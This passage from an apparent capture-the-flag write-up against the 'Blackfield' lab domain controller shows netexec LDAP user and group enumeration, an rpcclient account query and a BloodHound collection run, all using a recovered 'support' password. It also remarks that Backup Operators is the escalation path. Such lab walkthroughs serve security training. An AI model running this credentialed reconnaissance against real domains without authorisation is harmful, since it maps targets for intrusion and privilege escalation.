LDAP        10.129.229.17   389    DC01             BLACKFIELD532412              2020-02-23 20:49:23 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD996878              2020-02-23 20:49:24 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD653097              2020-02-23 20:49:25 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD438814              2020-02-23 20:49:26 0                                             
LDAP        10.129.229.17   389    DC01             svc_backup                    2020-02-24 01:54:48 0                                             
LDAP        10.129.229.17   389    DC01             lydericlefebvre               2020-02-29 06:33:35 0        @lydericlefebvre - VM Creator 

```

```
nxc ldap 10.129.229.17 -u 'support' -p '#00^BlackKnight' --groups
LDAP        10.129.229.17   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
LDAP        10.129.229.17   389    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight 
LDAP        10.129.229.17   389    DC01             Administrators                           membercount: 3
LDAP        10.129.229.17   389    DC01             Users                                    membercount: 3
LDAP        10.129.229.17   389    DC01             Guests                                   membercount: 2
LDAP        10.129.229.17   389    DC01             Print Operators                          membercount: 0
LDAP        10.129.229.17   389    DC01             Backup Operators                         membercount: 1
LDAP        10.129.229.17   389    DC01             Replicator                               membercount: 0
LDAP        10.129.229.17   389    DC01             Remote Desktop Users                     membercount: 0
LDAP        10.129.229.17   389    DC01             Network Configuration Operators          membercount: 0
LDAP        10.129.229.17   389    DC01             Performance Monitor Users                membercount: 0
LDAP        10.129.229.17   389    DC01             Performance Log Users                    membercount: 0
LDAP        10.129.229.17   389    DC01             Distributed COM Users                    membercount: 0
LDAP        10.129.229.17   389    DC01             IIS_IUSRS                                membercount: 1
LDAP        10.129.229.17   389    DC01             Cryptographic Operators                  membercount: 0
LDAP        10.129.229.17   389    DC01             Event Log Readers                        membercount: 0
LDAP        10.129.229.17   389    DC01             Certificate Service DCOM Access          membercount: 0
LDAP        10.129.229.17   389    DC01             RDS Remote Access Servers                membercount: 0
LDAP        10.129.229.17   389    DC01             RDS Endpoint Servers                     membercount: 0
LDAP        10.129.229.17   389    DC01             RDS Management Servers                   membercount: 0
LDAP        10.129.229.17   389    DC01             Hyper-V Administrators                   membercount: 0
LDAP        10.129.229.17   389    DC01             Access Control Assistance Operators      membercount: 0
LDAP        10.129.229.17   389    DC01             Remote Management Users                  membercount: 1
LDAP        10.129.229.17   389    DC01             Storage Replica Administrators           membercount: 0
LDAP        10.129.229.17   389    DC01             Domain Computers                         membercount: 0
LDAP        10.129.229.17   389    DC01             Domain Controllers                       membercount: 0
LDAP        10.129.229.17   389    DC01             Schema Admins                            membercount: 1
LDAP        10.129.229.17   389    DC01             Enterprise Admins                        membercount: 1
LDAP        10.129.229.17   389    DC01             Cert Publishers                          membercount: 0
LDAP        10.129.229.17   389    DC01             Domain Admins                            membercount: 1
LDAP        10.129.229.17   389    DC01             Domain Users                             membercount: 0
LDAP        10.129.229.17   389    DC01             Domain Guests                            membercount: 0
LDAP        10.129.229.17   389    DC01             Group Policy Creator Owners              membercount: 1
LDAP        10.129.229.17   389    DC01             RAS and IAS Servers                      membercount: 0
LDAP        10.129.229.17   389    DC01             Server Operators                         membercount: 0
LDAP        10.129.229.17   389    DC01             Account Operators                        membercount: 0
LDAP        10.129.229.17   389    DC01             Pre-Windows 2000 Compatible Access       membercount: 1
LDAP        10.129.229.17   389    DC01             Incoming Forest Trust Builders           membercount: 0
LDAP        10.129.229.17   389    DC01             Windows Authorization Access Group       membercount: 1
LDAP        10.129.229.17   389    DC01             Terminal Server License Servers          membercount: 0
LDAP        10.129.229.17   389    DC01             Allowed RODC Password Replication Group  membercount: 0
LDAP        10.129.229.17   389    DC01             Denied RODC Password Replication Group   membercount: 8
LDAP        10.129.229.17   389    DC01             Read-only Domain Controllers             membercount: 0
LDAP        10.129.229.17   389    DC01             Enterprise Read-only Domain Controllers  membercount: 0
LDAP        10.129.229.17   389    DC01             Cloneable Domain Controllers             membercount: 0
LDAP        10.129.229.17   389    DC01             Protected Users                          membercount: 0
LDAP        10.129.229.17   389    DC01             Key Admins                               membercount: 0
LDAP        10.129.229.17   389    DC01             Enterprise Key Admins                    membercount: 0
LDAP        10.129.229.17   389    DC01             DnsAdmins                                membercount: 0
LDAP        10.129.229.17   389    DC01             DnsUpdateProxy                           membercount: 0

```


The groups output is listing all domain groups with their member counts, not `support`'s specific memberships. Let's read it correctly.

---

This lists **all groups in the domain** with member counts — it does NOT mean `support` is in all of these. 

Interesting ones to note are:

- `Backup Operators` — 1 member (likely `svc_backup` — this is the privilege escalation path)
- `Remote Management Users` — 1 member (someone can WinRM, but not `support`)
- `Administrators` — 3 members

---

```
nxc ldap 10.129.229.17 -u 'support' -p '#00^BlackKnight' \
  --query "(sAMAccountName=support)" "memberOf"
LDAP        10.129.229.17   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
LDAP        10.129.229.17   389    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight 
LDAP        10.129.229.17   389    DC01             [+] Response for object: CN=support,CN=Users,DC=BLACKFIELD,DC=local
                                                                                                                                                    
┌──(lanc3㉿kali)-[~]
└─$ rpcclient -U 'BLACKFIELD.local/support%#00^BlackKnight' 10.129.229.17 -c "queryuser support"
        User Name   :   support
        Full Name   :
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Fri, 17 Apr 2026 15:27:49 +08
        Logoff Time              :      Thu, 01 Jan 1970 07:30:00 +0730
        Kickoff Time             :      Thu, 01 Jan 1970 07:30:00 +0730
        Password last set Time   :      Mon, 24 Feb 2020 01:53:24 +08
        Password can change Time :      Tue, 25 Feb 2020 01:53:24 +08
        Password must change Time:      Thu, 14 Sep 30828 10:48:05 +08
        unknown_2[0..31]...
        user_rid :      0x450
        group_rid:      0x201
        acb_info :      0x00010210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000009
        padding1[0..7]...
        logon_hrs[0..21]...

```

```

bloodhound-python -u support \
  -p '#00^BlackKnight' \
  -d BLACKFIELD.local \
  -ns 10.129.229.17 \
  -c All \
  --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: blackfield.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.blackfield.local:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 18 computers
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 316 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: DC01.BLACKFIELD.local
INFO: Done in 00M 03S
INFO: Compressing output into 20260417085749_bloodhound.zip

```